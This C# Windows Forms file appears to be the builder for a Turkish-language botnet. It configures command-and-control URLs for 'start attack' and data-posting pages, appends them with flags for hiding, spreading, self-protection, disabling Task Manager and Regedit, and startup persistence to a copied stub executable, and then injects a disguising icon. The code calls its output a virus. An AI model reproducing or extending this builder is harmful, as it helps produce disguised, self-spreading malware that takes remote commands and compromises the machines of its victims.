using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Builder
{
    public partial class homeForm : Form
    {

        string type = "http", server = "localhost", location = "botnet", commandPage = "saldiribaslat.php?id=", postPage = "verigir.php?id=";

        public homeForm()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        void addressUpdate()
        {
            txtCommand.Text = type + "://" + server + "/" + location + "/" + commandPage;
            txtSendData.Text = type + "://" + server + "/" + location + "/" + postPage;
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            comboBox1.SelectedIndex = 0;
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            type = comboBox1.Items[comboBox1.SelectedIndex].ToString();
            addressUpdate();
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            server = textBox1.Text;
            addressUpdate();

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            location = textBox2.Text;
            addressUpdate();

        }

        private void pictureBox2_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Icon file(*.ico)|*.ico";
            if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                pictureBox2.Image = new Bitmap(ofd.FileName);
                label11.Text = ofd.FileName;
            }
        }

        private void button4_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("http://localhost/" + textBox2.Text);
        }

        private void button5_Click(object sender, EventArgs e)
        {
            System.Diagnostics.Process.Start("http://localhost/phpmyadmin/");
        }

        

        private void button3_Click(object sender, EventArgs e)
        {
            if (txtName.Text == "stub.exe") { MessageBoxShow("Virüsün adını stub.exe koyamasın!", "Dur hele."); return; }
            if (!txtName.Text.EndsWith(".exe")) { txtName.Text += ".exe"; }
            if (!File.Exists("stub.exe")) { MessageBoxShow("Stub Yok \"0_o,\"", "Çko AyB ;("); return; }
            File.Copy(Application.StartupPath + "\\stub.exe", Application.StartupPath +"\\"+ txtName.Text);
            try
            {
                using (FileStream fs = new FileStream(txtName.Text, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
                {
                    using (BinaryWriter binaryWriter = new BinaryWriter(fs))
                    {
                        fs.Position = fs.Length + 1;
                        binaryWriter.Write("***" + txtCommand.Text + "*" + txtSendData.Text + "*" + (numericUpDown1.Value * 1000).ToString() + "*" +
                            (chBoxGizlen.Checked == true ? "1" : "0") + "*" +
                            (chBoxYayıl.Checked == true ? "1" : "0") + "*" +
                            (chBoxKorun.Checked == true ? "1" : "0") + "*" +
                            (chBoxTaskMgr.Checked == true ? "1" : "0") + "*" +
                            (chBoxRegedit.Checked == true ? "1" : "0") + "*" +
                            (chBoxStartup.Checked == true ? "1" : "0"));
                        binaryWriter.Flush();
                        binaryWriter.Close();
                    }
                    fs.Close();
                    MessageBoxShow("Oldu *_*", "Tm ^_^");
                    Entities.IconInjector.InjectIcon(txtName.Text,label11.Text);
                }
            }
            catch (Exception) {  }
        }

        private void MessageBoxShow(string Message, string Hood)
        {
            Item.MessageBoxShow mBox = new Item.MessageBoxShow(Message,Hood);
            mBox.ShowDialog();
        }
    }
}
